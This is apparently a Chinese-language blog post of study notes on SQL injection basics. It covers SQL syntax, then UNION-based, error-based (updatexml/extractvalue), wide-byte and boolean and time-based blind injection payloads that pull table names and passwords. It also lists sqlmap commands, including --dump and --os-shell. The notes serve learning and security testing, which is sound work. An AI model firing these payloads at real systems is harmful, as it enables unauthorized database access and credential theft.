---
title: SQL注入基础
date: 2023-12-02 09:37:58
tags: SQL
mathjax: true
---

# SQL注入基础

## SQL基础

### 新建数据、表

```sql
create database xxx;
create table xxx;

show database;
```

### 增删查改

```sql
insert into 表名(列1,列2,...) values (v1,v2,...);
#例如：
insert into student(id,name,grade)values(1,'zhangshan',98);
delete from 表名 where 条件;
update 表名 set 字段='值' where;
select */字段列表 from 表名 where;
```

### 举例联合查询

```sql
from oc_user where userName='root' union select * from oc_user where userName='zoneBAI'
```

###  排序

```sql
select * from 表名 order by 列名 #大于列数报错
```

### 常用函数

```sql
length()
limit(a,b) #从a+1开始的b条记录
substr(string string,num start,num length)
ascii()
left(name,2) #name左边第2个字符
right(name,2)
```

### 语句查询

```sql
select database(); #查询当前数据库
select table_name from information_schema.tables where table_schema=database(); #查询当前数据库表名
select column_name from information_schema.columns where table_name='oc_user'
```

## SQL注入基础

### 爆列数、数据库名、表名、列、值

``` sql
order by
union select 1,database(),3
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
union select 1,2,group_concat(username,password) from user--+
```

### concat

```sql
#concat 多个字符串连接成一个字符串
concat(str1,str2,...)
#concat_ws 同上，可一次性指定分隔符
concat_ws(separator,str1,str2,...)
#group_concat 将group by产生的同一个分组中的值连接起来，返回一个字符串结果。
group_concat([distinct]要连接的字段[order by 排序字段 asc/desc])
```

### 报错注入

```sql
#updatexml() 5.1.5+
updatexml(1,concat(0x7e,(select database()),0x7e),1) #前后添加~使其不符合xpath格式而报错

#extractvalue() 5.1.5+
and(extractvalue(1,concat(0x7e,(select database()),0x7e)))
and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))--+ #爆表名
and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.tables where table_name='users')))--+
```

### 宽字节注入

关键函数：`addslashes`、`mysql_real_escape_string`、`mysql_escape_string`、`magic_quote_gpc`、`magic_quote_gpc`

## SQLmap

常用参数：

```bash
sqlmap -u http://example.com --dbs #跑数据库
sqlmap -u http://example.com -D 数据库名 --tables #跑出指定数据库的表
sqlmap -u http://example.com -D 数据库名 -T 表名 --columns #跑出指定表的列名
sqlmap -u http://example.com -D 数据库名 -T 表名 --C 指定列 --dump #跑出指定列中的值
sqlmap -r *.txt #txt中保存的是BP抓包的请求 可自动分析
```

其他参数：

```
--user 列举数据库管理系统中的用户
--is-dba 检测当前用户是否是管理员
--os-shell 模拟一个可以执行任意命令的shell
--os-cmd 执行命令
--current-user 列举当前用户
--risk 风险等级
--level 检测级别
-proxy=http:// 设置代理
--batch 非交互模式
```

## 盲注

### 布尔盲注

```sql
and left((select database()),1)>'s'--+ #截取库名第一位
and left((select table_name from information_schema.tables where table_schema=database()limit 1,1),1)<'s'
```

### 时间盲注

```sql
and if('s'='s',sleep(5),1)--+ #正确延迟 错误不延迟
and if(left(database(),1)='s',sleep(5),1)--+
and if(left((select table_name from information_schema.tables where schema_name=database()limit 1,1),1)='s',sleep(5),1)--+#爆表
and if(left((select password from users order by id limit 0,1),4)=='dumb',sleep(5),1)--+#爆值
```

### 堆叠注入

